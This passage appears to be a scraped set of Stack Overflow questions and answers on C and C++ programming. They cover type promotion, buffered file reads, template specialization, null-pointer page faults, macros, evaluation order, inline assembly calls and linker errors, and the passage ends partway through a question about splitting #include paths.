<p>In your case, the function is expecting a <code>double</code> parameter, but you're trying to pass in an <code>int</code>.  The compiler does not do any promotion here from <code>int</code> to <code>double</code>, so undefined behavior results.  You need to always pass in a <code>double</code> value here, either as an explicit <code>double</code> constant value such as <code>1.0</code>, or perform the conversion using a typecast.</p>
"
"<p>I'm reading (in binary format) a file of unsigned 8-bit integers, which I then need to convert to an array of floats. Normally I'd just do something like the following:</p>

<pre><code>uint8_t *s1_tmp = (uint8_t *)malloc(sizeof(uint8_t)*num_elements);
float *s1 = (float *)malloc(sizeof(float)*num_elements);

fread(s1_tmp, sizeof(uint8_t), num_elements, file_id);

for(int i = 0; i &lt; num_elements; i++){
    s1[i] = s1_tmp[i];
}

free(s1_tmp)
</code></pre>

<p>Uninspired to be sure, but it works. However, currently <code>num_elements</code> is around 2.7 million, so the process is super slow and IMO wasteful. </p>

<p>Is there a better way to read in the 8-bit integers as floats or convert the <code>uint8_t</code> array into a float array?</p>
","9530","","<p>Firstly, this is going to be I/O-bound from reading the data in.  Secondly, it's going to be memory-bound.  You'll get much better cache performance if you interleave the conversion with the reading.</p>

<p>Pick some reasonable buffer size that's large enough for good I/O performance but small enough to fit in your cache, maybe 8-32 KB or so.  Read in that much data, convert, and repeat.</p>

<p>For example:</p>

<pre><code>#define BUFSIZE 16384
uint8_t *buffer = malloc(BUFSIZE);
float *s1 = malloc(num_elements * sizeof(float));

int total_read = 0;
int n;
while(total_read &lt; num_elements &amp;&amp; (n = fread(buffer, 1, BUFSIZE, file_id)) &gt; 0)
{
    n = min(n, num_elements - total_read);
    for(int i = 0; i &lt; n; i++)
        s1[total_read + i] = (float)buffer[i];
    total_read += n;
}
free(buffer);
</code></pre>

<p>You might also see improved performance by using SIMD operations to convert multiple items at once.  However, the total performance will still be bottlenecked by the I/O from fread, so how much improvement you might see from SIMD will be questionable.</p>

<p>Since you're converting a large number of <code>uint8_t</code> values, it's all possible you could get some improved performance by using a lookup table instead of doing the integer to floating point conversion.  You'd only need a lookup table of 256 float values (1 KB), which easily fits in cache.  I don't know if that would be faster or not, so you should definitely profile the code to figure out what the best option is.</p>
"
"<p>Is the following code valid with C++ standard? It's strange that C::B would work because struct B is in A's namespace. But it does compile fine with gcc.</p>

<pre><code>struct A { struct B {}; };
struct C : public A::B {};
struct D : public C::B {};
</code></pre>

<p>If this is standard conforming C++, what are reasonable applications for this construct?
Thanks.</p>
","9530","","<p>Yes, it's valid C++.  A class in its own scope (so both <code>B</code> and <code>B::B</code> refer to the same class <code>B</code>), and a class's parent class is in its own scope.  So since <code>B</code> is in <code>C</code>'s scope and <code>B</code> is in its own scope, <code>C::B</code> refers to <code>B</code> which is <code>A::B</code>.</p>

<p>(Side note: do not confuse a <em>namespace</em> with a <em>scope</em>.)</p>

<p>C++03 §9 paragraph 2 says:</p>

<blockquote>
  <p>A <em>class-name</em> is inserted into the scope in which it is declared immediately after the <em>class-name</em> is seen.
  The <em>class-name</em> is also inserted into the scope of the class itself; this is known as the <em>injected-class-name</em>.
  For purposes of access checking, the <em>injected-class-name</em> is treated as if it were a public member name.</p>
</blockquote>
"
"<p>Let's say there is a pointer and we initialize it with NULL.</p>

<pre><code>int* ptr = NULL;
*ptr = 10;
</code></pre>

<p>Now , the program will crash since <code>ptr</code> isn't pointing to any address and we're assigning a value to that , which is an invalid access. So , the question is , what happens internally in the OS ? Does a page-fault / segmentation-fault occur ? Will the kernel even search in the page table ? Or the crash occur before that?</p>

<p>I know I wouldn't do such a thing in any program but this is just to know what happens internally in the OS or Compiler in such a case. And it is NOT a duplicate question.</p>
","9530","","<p><strong>Short answer</strong>: it depends on a lot of factors, including the compiler, processor architecture, specific processor model, and the OS, among others.</p>

<p><strong>Long answer (x86 and x86-64)</strong>: Let's go down to the lowest level: the CPU.  On x86 and x86-64, that code will typically compile into an instruction or instruction sequence like this:</p>

<pre><code>movl $10, 0x00000000
</code></pre>

<p>Which says to ""store the constant integer 10 at virtual memory address 0"".  The <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"">Intel® 64 and IA-32 Architectures Software Developer Manuals</a> describe in detail what happens when this instruction gets executed, so I'm going to summarize it for you.</p>

<p>The CPU can operate in several different modes, several of which are for backwards compatibility with much older CPUs.  Modern operating systems run user-level code in a mode called <em>protected mode</em>, which uses <a href=""http://en.wikipedia.org/wiki/Paging"">paging</a> to convert virtual addresses into physical addresses.</p>

<p>For each process, the OS keeps a <em>page table</em> which dictates how the addresses are mapped.  The page table is stored in memory in a specific format (and protected so that they can not be modified by the user code) that the CPU understands.  For every memory access that happens, the CPU translates it according to the page table.  If the translation succeeds, it performs the corresponding read/write to the physical memory location.</p>

<p>The interesting things happen when the address translation fails.  Not all addresses are valid, and if any memory access generates an invalid address, the processor raises a <em>page fault exception</em>.  This triggers a transition from <em>user mode</em> (aka <em>current privilege level (CPL) 3</em> on x86/x86-64) into <em>kernel mode</em> (aka CPL 0) to a specific location in the kernel's code, as defined by the <em>interrupt descriptor table</em> (IDT).</p>

<p>The kernel regains control and, based on the information from the exception and the process's page table, figures out what happened.  In this case, it realizes that the user-level process accessed an invalid memory location, and then it reacts accordingly.  On Windows, it will invoke <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680657%28v=vs.85%29.aspx"">structured exception handling</a> to allow the user code to handle the exception.  On POSIX systems, the OS will deliver a <code>SIGSEGV</code> signal to the process.</p>

<p>In other cases, the OS will handle the page fault internally and restart the process from its current location as if nothing happened.  For example, <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366549%28v=vs.85%29.aspx"">guard pages</a> are placed at the bottom of the stack to allow the stack to grow on demand up to a limit, instead of preallocating a large amount of memory for the stack.  Similar mechanisms are used for achieving <a href=""http://en.wikipedia.org/wiki/Copy-on-write"">copy-on-write</a> memory.</p>

<p>In modern OSes, the page tables are usually set up to make the address 0 an invalid virtual address.  But sometimes it's possible to change that, e.g. on Linux by writing 0 to the pseudofile <code>/proc/sys/vm/mmap_min_addr</code>, after which it's possible to use <code>mmap(2)</code> to map the virtual address 0.  In that case, dereferencing a null pointer would not cause a page fault.</p>

<p>The above discussion is all about what happens when the original code is running in user space.  But this could also happen inside the kernel.  The kernel can (and is certainly much more likely than user code to) map the virtual address 0, so such a memory access would be normal.  But if it's not mapped, then what happens then is largely similar: the CPU raises a page fault error which traps into a predefined point at the kernel, the kernel examines what happened, and reacts accordingly.  If the kernel can't recover from the exception, it will typically panic in some fashion (<em>kernel panic</em>, <em>kernel oops</em>, or a BSOD on Windows, e.g.) by printing out some debug information to the console or serial port and then halting.</p>

<p>See also <a href=""https://blogs.oracle.com/ksplice/entry/much_ado_about_null_exploiting1"">Much ado about NULL: Exploiting a kernel NULL dereference </a> for an example of how an attacker could exploit a null pointer dereference bug from inside the kernel in order to gain root privileges on a Linux machine.</p>
"
"<p>The <code>bind()</code> function gets <code>const struct sockaddr *addr</code> as one of parameters. Can I pass a temp <code>sockaddr</code> structure, that will be deleted immediately after <code>bind()</code> calling?</p>

<pre><code>void bindMe(int socket) {
    struct sockaddr_in addr = {...};
    bind(socket, (struct sockaddr_in*)&amp;addr, sizeof(sockaddr_in));
}
// addr is no more exist after function calling, 
// but I still want to work with the socket.
</code></pre>

<p>Also, there is a lot of function in POSIX take pointer to structs. How can I determine if I can free the struct after function calling?</p>
","9530","","<p>Yes, you can do that.  <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/bind.html""><code>bind</code></a> is a synchronous system call, so once it returns, the kernel is all done with the parameters.</p>

<p>If the socket is non-blocking and <code>bind</code> returns <code>EINPROGRESS</code> to indicate that the bind is happening asynchronously, it's still safe to free the struct.  The kernel copies the struct internally while the operation completes asynchronously.</p>

<blockquote>
  <p>How can I determine if I can free the struct after function calling?</p>
</blockquote>

<p>Read the documentation.  Most POSIX functions are synchronous, and the parameters can safely be deallocated after the function returns, but that's not always true.  If you're unsure, read the documentation.  And obviously if you have multiple threads in your program, you shouldn't be concurrently modifying the data from another thread while an API call is in progress.</p>
"
"<p>I'm using GNU/Linux, C++, SDL 1.3
I'm trying to write the code for a ""Window"" class.</p>

<pre><code>#ifndef WINDOW_H
#define WINDOW_H

#include ""SDL/SDL.h""
#include ""SDL/SDL_video.h""
#include ""../other/Logger.h""

using namespace std;

class Window {
    public:
        Window(int width, int height, string title);
        ~Window();

    private:
        static const string TAG;
        SDL_Window* window; 
        int width;
        int height;
};

#endif /* WINDOW_H */ 
</code></pre>

<p>And when I try to compile I get this error:</p>

<pre><code>In file included from Window.cpp:1:0:
Window.h:15:3: error: ‘SDL_Window’ does not name a type.
</code></pre>
","9530","","<p><code>SDL_Window</code> is a datatype from SDL 2.  If you're using SDL 1.x, you need to write your code differently.  See the <a href=""http://wiki.libsdl.org/moin.cgi/MigrationGuide"" rel=""nofollow"">Migration Guide</a> for more information.</p>
"
"<p>I want to do something like this...</p>

<pre><code>class A;
class B;
class C;

void a(A);
void b(B);
void c(C);

template&lt;typename T&gt; void f(T t)
{
  if (some condition)
    a(t)
  else if (some other condition)
    b(t)
  else
    c(t);
}

int main()
{
    A myA;
    B myB;
    C myC;

    f(myA);  // some condition ensures f(myA) only calls a(myA)
    f(myB);  // some condition ensures f(myB) only calls b(myB)
    f(myC);  // some condition ensures f(myC) only calls c(myC)

    return 0;
}
</code></pre>

<p>But this doesn't compile because a(B), a(C), b(A), b(C), c(A), c(B) are not defined.</p>

<p>Is there a way to resolve this?  I tried to see if std::function() or std::bind() could be used to construct a call to a(), b(), or c() dynamically, but no luck.</p>
","9530","","<p>Are you looking for template specialization?</p>

<pre><code>template&lt;typename T&gt; void f(T t)
{
    // Generic implementation
}

// Specialization for A
template&lt;&gt; void f(A a)
{
    // A-specific behavior
}
// Repeat for B and C etc.
</code></pre>
"
"<p>I'm having the following problem with a macro for a function.  This was working until I added the print_heavyhitters function.  I have this in m61.h:</p>

<pre><code>#if !M61_DISABLE
#define malloc(sz)      m61_malloc((sz), __FILE__, __LINE__)
#define free(ptr)       m61_free((ptr), __FILE__, __LINE__)
#define realloc(ptr, sz)    m61_realloc((ptr), (sz), __FILE__, __LINE__)
#define calloc(nmemb, sz)   m61_calloc((nmemb), (sz), __FILE__, __LINE__)
#define print_heavyhitters(sz)  print_heavyhitters((sz), __FILE__, __LINE__)
#endif
</code></pre>

<p>in m61.c, all of these functions are fine except print_heavyhitters(sz).  I get ""   - Macro usage error on the function print_heavyhitters:</p>

<pre><code>- Macro usage error for macro: 
 print_heavyhitters
- Syntax error
</code></pre>

<p>m61.c:</p>

<pre><code>#include ""m61.h""
...

void *m61_malloc(size_t sz, const char *file, int line) {...}

void print_heavyhitters(size_t sz, const char *file, int line) {...}
</code></pre>
","9530","","<p>Using the same name for the macro and for the function name is OK as far as the preprocessor is concerned, since it won't expand it recursively, but it can easily lead to confusing errors such as this.  You can do this as long as you're careful to <code>#undef</code> it in the right places, but I'd recommend using a different symbol name to avoid confusion.</p>

<p>I'd do something like this:</p>

<pre><code>// Header file
#if !M61_DISABLE
...
#define print_heavyhitters(sz)  m61_print_heavyhitters((sz), __FILE__, __LINE__)
#endif

// Source file
#include ""m61.h""

#if !M61_DISABLE
#undef print_heavyhitters
#endif

void print_heavyhitters(size_t sz)
{
    // Normal implementation
}

void m61_print_heavyhitters(size_t sz, const char *file, int line)
{
    // Debug implementation
}
</code></pre>
"
"<p>I am writing a C program like the following where I am assigning a value to a variable 
pointed by a global pointer, which is being changed by a function call on the right side of the assignment.</p>

<p>But the change occurs to the location where it pointed before.
So for the following code, it prints </p>

<p>""GP:5 P:5 GPV:11"" , </p>

<p>where it should be </p>

<p>""GP:10 P:10 GPV:9""</p>

<p>I tried it compiling with both -O2 and -O0. Same output.</p>

<p>I know that it is fixed if I just break the assignment into 2 lines. But the project I am working on has lots of places like this.</p>

<p>Is this possible to make it work like I want without breaking it into 2 lines?</p>

<p>Any suggestion is highly appreciated.</p>

<pre><code>#include &lt;stdio.h&gt;

int * gp;  
// volatile int *gp;   // I tried these two.    
// int * volatile gp;  // Didn't help.

int func(int *p) 
{  
   *p = 5;
   gp = p;  
   return *p;
}

int main()                                                                      
{                                                                               
   int p = 7;
   int gp_v;
   gp = &amp;gp_v; 
   *gp = 8;
   *gp = func(&amp;p) + *gp;
   gp_v ++;
   printf(""GP:%d P:%d GPV:%d\n"", *gp, p, gp_v);
   return(0); 
}
</code></pre>
","9530","","<p>This line has unspecified behavior:</p>

<pre><code>*gp = func(&amp;p) + *gp;
</code></pre>

<p>The C standard does not specify the order that arguments are evaluated in within expressions, so the compiler is free to execute <code>func(&amp;p)</code> either before or after reading <code>*gp</code> for computing the addition.  Likewise, it can evaluate the <code>*gp</code> on the left-hand side of the assignment (to determine that address where it's storing the result to) before or after it evaluates the value it's storing.</p>

<p>You need to break up your statement into separate statements in order for it to have well-defined behavior.  Either of these would work, but they have different semantics:</p>

<pre><code>// Option 1: write to old location of *gp
int *old_gp = gp;
int old_gp_val = *gp;
*old_gp = func(&amp;p) + old_gp_val;

// Option 2: write to new location of *gp
int old_gp_val = *gp;
int new_val = func(&amp;p) + old_gp_val;
*gp = new_val;
</code></pre>
"
"<p>I'm having problems with the use of the class <code>NSImage</code>. I'm trying to use the function <code>initWithData:</code> but it does not work (anything related to <code>NSImage</code> doesn't work). Here is a simple example of what im trying. The <code>NSData</code> data is right.</p>

<p>My project is a commandline tool of foundation type.</p>

<pre><code>NSData *imdata =[[NSData alloc] initWithContentsOfFile:@""/Users/JulianDavid/Desktop/ecoli_20000.png""];
if(!imdata){
    NSLog(@""there is data"");
}
NSImage *imag=[[NSImage alloc]initWithData:imdata];
</code></pre>
","9530","","<p>The error</p>

<pre><code>Undefined symbols for architecture x86_64: ""_OBJC_CLASS_$_NSImage""
</code></pre>

<p>means that the linker can't find the code implementing the <code>NSImage</code> class.  According to the <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/nsimage_Class/Reference/Reference.html"" rel=""nofollow""><code>NSImage</code> documentation</a>, it's implemented in the AppKit framework.  So, in order for the linker to link the code properly, you need to link against the AppKit framework.  Do this by <a href=""http://stackoverflow.com/questions/3352664/how-to-add-existing-frameworks-in-xcode-4"">adding the AppKit framework</a> into your Xcode project.</p>
"
"<p>I've got some code that compiles fine under MSVC (or so say the Windows developers who sent me it), but gives an error under CLang. Having looked around I've found that CLang is indeed more strict about resolving template specializations, but I'm not sure where I should put the specializations in my case. Basically one of my files has a struct like this:</p>

<pre><code>template&lt;&gt;
struct iterator_traits&lt; char * &gt;   // error is here
{
    typedef random_access_iterator_tag iterator_category;
    typedef char value_type;
    typedef ptrdiff_t difference_type;
    typedef difference_type distance_type;
    typedef char * pointer;
    typedef char &amp; reference;
};
</code></pre>

<p>This is within a <code>namespace std</code> block. The error message is:</p>

<pre><code>Explicit specialization of 'std::iterator_traits&lt;char *&gt;' after instantiation
</code></pre>

<p>Another part of the same error message (viewed by 'expanding' the error message in Xcode) says <code>Implicit instantiation first required here</code>, and clicking on that takes me to <code>stl_iterator.h</code>, specifically this line (line 642):</p>

<pre><code>typedef typename iterator_traits&lt;_Iterator&gt;::iterator_category
                                                         iterator_category;
</code></pre>

<p>Does anyone know what the correct thing to do would be in this case? I've seen examples involving classes but never one involving a struct.</p>
","9530","","<p>The compiler is complaining that you're trying to specialize a template after instantiating the generic template -- by that point in time, the compiler has already used the generic template for the instantiation, and it can't go back and use your specialization instead.  In other words, something like this:</p>

<pre><code>template &lt;typename T&gt;
struct X
{
    // Generic implementation
};

// Instantiate template by using it in any way
X&lt;int&gt; foo;

template&lt;&gt;
struct X&lt;int&gt;
{
    // Specialization implementation for int
};
</code></pre>

<p>The fix is to define the specialization <em>before</em> it's instantiated, so in this example, you'd move the <code>X&lt;int&gt;</code> specialization to before where <code>X&lt;int&gt;</code> is used.</p>

<p>Note that the STL already defines specializations of <code>std::iterator_trait</code> for pointer types, so there's no need to define your own specialization here for <code>char*</code>.  You'd typically only do that for user-defined iterator types which are not pointers.  See §24.3.1/2 of the C++03 standard:</p>

<blockquote>
  <p>[The template <code>iterator_traits&lt;Iterator&gt;</code>] is specialized for pointers as</p>

<pre><code>template&lt;class T&gt; struct iterator_traits&lt;T*&gt; {
  typedef ptrdiff_t difference_type;
  typedef T value_type;
  typedef T* pointer;
  typedef T&amp; reference;
  typedef random_access_iterator_tag iterator_category;
};
</code></pre>
  
  <p>and for pointers to <code>const</code> as</p>

<pre><code>template&lt;class T&gt; struct iterator_traits&lt;const T*&gt; {
  typedef ptrdiff_t difference_type;
  typedef T value_type;
  typedef const T* pointer;
  typedef const T&amp; reference;
  typedef random_access_iterator_tag iterator_category;
};
</code></pre>
</blockquote>

<p>So there's no point to providing your own <code>std::iterator_traits&lt;char*&gt;</code> specialization.  Since <code>char*</code> is not a user-defined type, it's also undefined behavior according to the standard.  §17.4.3.1/1 says:</p>

<blockquote>
  <p>It is undefined for a C + + program to add declarations or definitions to namespace std or namespaces
  within namespace <code>std</code> unless otherwise specified. A program may add template specializations for any
  standard library template to namespace <code>std</code>. Such a specialization (complete or partial) of a standard
  library template results in undefined behavior unless the declaration depends on a user-defined name of
  external linkage and unless the specialization meets the standard library requirements for the original template.<sup>163)</sup></p>
  
  <p>163) Any library code that instantiates other library templates must be prepared to work adequately with any user-supplied specialization
  that meets the minimum requirements of the Standard</p>
</blockquote>
"
"<p>so as I said, I'm trying to call a method using inline asm using gcc. So, I searched how x86 works, and what are the calling convention, then I tried some easy call witch worked perfectly. Then I tried to embed v8, which was my original goal, but it didn't work so well...
Here's my code :</p>

<pre><code>v8::Handle&lt;v8::Value&gt; V8Method::staticInternalMethodCaller(const v8::Arguments&amp; args, int argsize, void* object, void* method)
{
    int i = 0;
    char* native_args;

    // Move the ESP to the end of the array (argsize is the array size in byte)
    asm(""subl %1, %%esp;""
        ""movl %%esp, %0;""
        : ""=r""(native_args)
        : ""r""(argsize));


    // This for loop only converts V8 type to native type,
    // and puts them in the array:

    for (; i &lt; args.Length(); ++i)
    {
        if (args[i]-&gt;IsInt32())
        {
            *(int*)(native_args) = args[i]-&gt;Int32Value();

            native_args += sizeof(int);
        }
        else if (args[i]-&gt;IsNumber())
        {
            *(float*)(native_args) = (float)(args[i]-&gt;NumberValue());

            native_args += sizeof(float);
        }
    }

    // Then call the method:

    asm(""call *%1;"" : : ""c""(object), ""r""(method));

    return v8::Null();
}
</code></pre>

<p>And here is the generated assembly :</p>

<pre><code>__ZN3srl8V8Method26staticInternalMethodCallerERKN2v89ArgumentsEiPvS5_:
LFB1178:
    .cfi_startproc
    .cfi_personality 0,___gxx_personality_v0
    .cfi_lsda 0,LLSDA1178
    pushl   %ebp
    .cfi_def_cfa_offset 8
    .cfi_offset 5, -8
    movl    %esp, %ebp
    .cfi_def_cfa_register 5
    pushl   %ebx
    subl    $68, %esp
    .cfi_offset 3, -12
    movl    $0, -12(%ebp)
    movl    12(%ebp), %eax
/APP
 # 64 ""method.cpp"" 1
    subl %eax, %esp; movl %esp, %ebx; addl $4, %esp
 # 0 """" 2
/NO_APP
    movl    %ebx, -16(%ebp)
    jmp L74
L77:
    movl    -12(%ebp), %eax
    movl    %eax, (%esp)
    movl    8(%ebp), %ecx
LEHB25:
    call    __ZNK2v89ArgumentsixEi
LEHE25:
    subl    $4, %esp
    movl    %eax, -36(%ebp)
    leal    -36(%ebp), %eax
    movl    %eax, %ecx
    call    __ZNK2v86HandleINS_5ValueEEptEv
    movl    %eax, %ecx
LEHB26:
    call    __ZNK2v85Value7IsInt32Ev
LEHE26:
    testb   %al, %al
    je  L75
    movl    -12(%ebp), %eax
    movl    %eax, (%esp)
    movl    8(%ebp), %ecx
LEHB27:
    call    __ZNK2v89ArgumentsixEi
LEHE27:
    subl    $4, %esp
    movl    %eax, -32(%ebp)
    leal    -32(%ebp), %eax
    movl    %eax, %ecx
    call    __ZNK2v86HandleINS_5ValueEEptEv
    movl    %eax, %ecx
LEHB28:
    call    __ZNK2v85Value10Int32ValueEv
LEHE28:
    movl    %eax, %edx
    movl    -16(%ebp), %eax
    movl    %edx, (%eax)
    movl    -16(%ebp), %eax
    movl    (%eax), %ebx
    movl    $LC4, 4(%esp)
    movl    $__ZSt4cout, (%esp)
LEHB29:
    call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
    movl    -16(%ebp), %edx
    movl    %edx, (%esp)
    movl    %eax, %ecx
    call    __ZNSolsEPKv
    subl    $4, %esp
    movl    $LC5, 4(%esp)
    movl    %eax, (%esp)
    call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
    movl    %ebx, (%esp)
    movl    %eax, %ecx
    call    __ZNSolsEi
    subl    $4, %esp
    movl    $__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, (%esp)
    movl    %eax, %ecx
    call    __ZNSolsEPFRSoS_E
    subl    $4, %esp
    addl    $4, -16(%ebp)
    jmp L76
L75:
    movl    -12(%ebp), %eax
    movl    %eax, (%esp)
    movl    8(%ebp), %ecx
    call    __ZNK2v89ArgumentsixEi
LEHE29:
    subl    $4, %esp
    movl    %eax, -28(%ebp)
    leal    -28(%ebp), %eax
    movl    %eax, %ecx
    call    __ZNK2v86HandleINS_5ValueEEptEv
    movl    %eax, %ecx
LEHB30:
    call    __ZNK2v85Value8IsNumberEv
LEHE30:
    testb   %al, %al
    je  L76
    movl    -12(%ebp), %eax
    movl    %eax, (%esp)
    movl    8(%ebp), %ecx
LEHB31:
    call    __ZNK2v89ArgumentsixEi
LEHE31:
    subl    $4, %esp
    movl    %eax, -24(%ebp)
    leal    -24(%ebp), %eax
    movl    %eax, %ecx
    call    __ZNK2v86HandleINS_5ValueEEptEv
    movl    %eax, %ecx
LEHB32:
    call    __ZNK2v85Value11NumberValueEv
LEHE32:
    fstps   -44(%ebp)
    flds    -44(%ebp)
    movl    -16(%ebp), %eax
    fstps   (%eax)
    movl    -16(%ebp), %eax
    movl    (%eax), %ebx
    movl    $LC4, 4(%esp)
    movl    $__ZSt4cout, (%esp)
LEHB33:
    call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
    movl    -16(%ebp), %edx
    movl    %edx, (%esp)
    movl    %eax, %ecx
    call    __ZNSolsEPKv
    subl    $4, %esp
    movl    $LC5, 4(%esp)
    movl    %eax, (%esp)
    call    __ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
    movl    %ebx, (%esp)
    movl    %eax, %ecx
    call    __ZNSolsEf
    subl    $4, %esp
    movl    $__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, (%esp)
    movl    %eax, %ecx
    call    __ZNSolsEPFRSoS_E
    subl    $4, %esp
    addl    $4, -16(%ebp)
L76:
    incl    -12(%ebp)
L74:
    movl    8(%ebp), %ecx
    call    __ZNK2v89Arguments6LengthEv
    cmpl    -12(%ebp), %eax
    setg    %al
    testb   %al, %al
    jne L77
movl    16(%ebp), %eax
    movl    20(%ebp), %edx
    movl    %eax, %ecx
/APP
 # 69 ""method.cpp"" 1
    call *%edx;
 # 0 """" 2
/NO_APP
    call    __ZN2v84NullEv
    leal    -20(%ebp), %edx
    movl    %eax, (%esp)
    movl    %edx, %ecx
    call    __ZN2v86HandleINS_5ValueEEC1INS_9PrimitiveEEENS0_IT_EE
    subl    $4, %esp
    movl    -20(%ebp), %eax
jmp L87
L83:
    movl    %eax, (%esp)
    call    __Unwind_Resume
L84:
    movl    %eax, (%esp)
    call    __Unwind_Resume
L85:
    movl    %eax, (%esp)
    call    __Unwind_Resume
L86:
    movl    %eax, (%esp)
    call    __Unwind_Resume
LEHE33:
L87:
    movl    -4(%ebp), %ebx
    leave
    .cfi_restore 5
    .cfi_restore 3
    .cfi_def_cfa 4, 4
    ret
    .cfi_endproc
</code></pre>

<p>So, this static method is a callback (I do some signature checking before) witch is supposed to call the specific method providing valid C++ native args. In order to speed up a little bit and avoid copies of args, I'm trying to load all param in an local array, and then modify the ESP to make this array an argument.</p>

<p>The method call works well, but I don't get correct arguments... I've done lots of research about function call, calling convention, and lots of test (which were all successful), but I don't understand what is going on... Is there something I missed ?</p>

<p>Basically, the callee is supposed to get its arguments at the top of the esp, in my case, the array... (I precise that the array is valid)</p>

<p>I use GCC.</p>
","9530","","<p>I'd recommend not trying to do this yourself, there are a lot of annoying little details that have to be gotten exactly right.  I'd suggest instead using the <a href=""http://www.haible.de/bruno/packages-ffcall.html"" rel=""nofollow"">FFCALL library</a>, specifically the <a href=""http://www.haible.de/bruno/documentation/ffcall/avcall/avcall.html"" rel=""nofollow"">avcall</a> set of methods, to do this.</p>

<p>I imagine that something like this would do what you want:</p>

<pre><code>v8::Handle&lt;v8::Value&gt; V8Method::staticInternalMethodCaller(const v8::Arguments&amp; args, int argsize, void* object, void* method)
{
    // Set up the argument list with the function pointer, return type, and
    // pointer to value storing the return value (assuming int, change if
    // necessary)
    int return_value;
    av_alist alist;
    av_start_int(alist, method, &amp;return_value);

    for(int i = args.Length() - 1; i &gt;= 0; i--)
    {
        // Push the arguments onto the argument list
        if (args[i]-&gt;IsInt32())
        {
            av_int(alist, args[i]-&gt;Int32Value());
        }
        else if (args[i]-&gt;IsNumber())
        {
            av_double(alist, (float)(args[i]-&gt;NumberValue());
        }
    }

    av_call(alist);  // Call the function

    return v8::Null();
}
</code></pre>
"
"<p>I am trying to use curl and <a href=""http://www.deanclatworthy.com/imdb"" rel=""nofollow"">http://www.deanclatworthy.com/imdb</a> to get movie and tv show information from IMDB. I am using the simple.c example from <a href=""http://curl.haxx.se/libcurl/c/simple.html"" rel=""nofollow"">http://curl.haxx.se/libcurl/c/simple.html</a></p>

<pre><code>cout &lt;&lt; ""Type a movie name: "" &lt;&lt; endl;
getline(cin, searchTerm);

replace(searchTerm.begin(), searchTerm.end(), ' ', '+');

CURL *curl;
CURLcode res;

string temp;
temp = ""http://www.deanclatworthy.com/imdb/?q="" + searchTerm;

curl = curl_easy_init();

if(curl) {

    curl_easy_setopt(curl, CURLOPT_URL, temp.c_str());

    /* Perform the request, res will get the return code */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
        fprintf(stderr, ""curl_easy_perform() failed: %s\n"",
                curl_easy_strerror(res));

    /* always cleanup */
    curl_easy_cleanup(curl);
}
</code></pre>

<p>This is my output, if i search for The Dark Knight Rises: </p>

<p><strong>Type a movie name:</strong>
The Dark Knight Rises
<strong>{""imdbid"":""tt1345836"",""imdburl"":""http://www.imdb.com/title/tt1345836/"",""genres"":""Action,Crime,Thriller"",""languages"":""English"",""country"":""USA,UK"",""votes"":""390735"",""stv"":0,""series"":0,""rating"":""8.8"",""runtime"":""165min"",""title"":""The Dark Knight Rises"",""year"":""2012"",""usascreens"":4404,""ukscreens"":0}</strong></p>

<p>My problem is that i want the text that is returned, with the information, to be put into an array so i can get it up nice, e.g.</p>

<pre><code>movieInto[14] = *array*
</code></pre>

<p>and then i can call the different parts of the array if i want to title, rating, year and so on. It is already formatted as an array but i cant figure out what to call to get the into. </p>

<p>Hope the bright minds in here can help me out =)</p>
","9530","","<p>That data looks like JSON, so you should use a JSON parser -- there are <a href=""https://www.google.com/search?q=c%2B%2B+json+parser"" rel=""nofollow"">many options</a>.</p>
"
"<p>I have this... weird problem and I'm desperately looking for a solution.</p>

<p>We have this example: (made for 32-bit systems)</p>

<pre><code>#include &lt;stdio.h&gt;

//unsigned foo(unsigned arg_a, unsigned arg_b) {
unsigned foo(unsigned arg_a, ...) {
        unsigned *temp = (unsigned *)((unsigned)&amp;arg_a + 4);
        return *temp + arg_a;
}

int main(void) {
        int i = foo(0xbe00, 0x00af);
        printf(""We got a %x\n"", i);
        return 0;
}
</code></pre>

<p>Function foo has 2 arguments. The goal is to ""guess"" the address of arg_b based on the address of the arg_a. This is based on the assumption that caller (main) will push arg_a and arg_b into the stack (so that (int)&amp;arg_b - (int)&amp;arg_a == 4 ).</p>

<p>Depending on the compiler and the optimization level, the output differs as follows:</p>

<pre><code> gcc -g -Wall -O0 test.c
 ./a.out 
We got a beaf
 gcc -g -Wall -O1 test.c
 ./a.out 
We got a beaf
 gcc -g -Wall -O2 test.c
 ./a.out 
We got a 80542b0
 gcc -g -Wall -O3 test.c
 ./a.out 
We got a 80542b0
 clang -g -Wall -O0 test.c
 ./a.out 
We got a 8054281
 clang -g -Wall -O1 test.c
 ./a.out 
We got a 805423f
 clang -g -Wall -O2 test.c
 ./a.out 
We got a b768d9d6
 clang -g -Wall -O3 test.c
 ./a.out 
We got a b76899d6
</code></pre>

<p>(The example is quite unstable and for example by putting a printf inside foo, gcc always prints ""We got a beaf"". Clang.. not..)</p>

<p>The above example is just my way to try and be clear.</p>

<p>My REAL question (and my goal) is the following: 
How can a extract the original address of arg_a, i.e. the address that the caller (main) pushed 0xbe00 in the stack by using CLANG from inside foo function? (gcc is not an option, although it's still interesting)</p>

<p>Thanx for your time!</p>

<p>edit: made foo variadic in order for the question to make more sense...</p>
","9530","","<p>In short, don't do that.</p>

<p>What you're doing is undefined behavior.  If you want the address of <code>arg_b</code>, then write <code>&amp;arg_b</code>.  Trying to get it by using pointery trickery with <code>arg_a</code> will not work because of C's aliasing rules.  The compiler assumes that certain pointers won't alias each other, so the optimizer makes assumptions which are no longer true when you do that.  As a result, the code functions improperly.</p>
"
"<p>I wish there was a way to split a #include directive across two lines, so that my code can conform to 80 characters per line, despite the necessity of a very long include path.</p>

<p>Other than expanding the search path of the compiler, how can I manage this?  Is there a way to split my very long path string into two lines?</p>

<p>""#define"" macro expansion apparently happens after #include expansion, so these don't work:</p>

<pre><code>#define BIGPATH ""...""
#include BIGPATH ## ""/foo.c""
#include ""BIGPATH/foo.c""
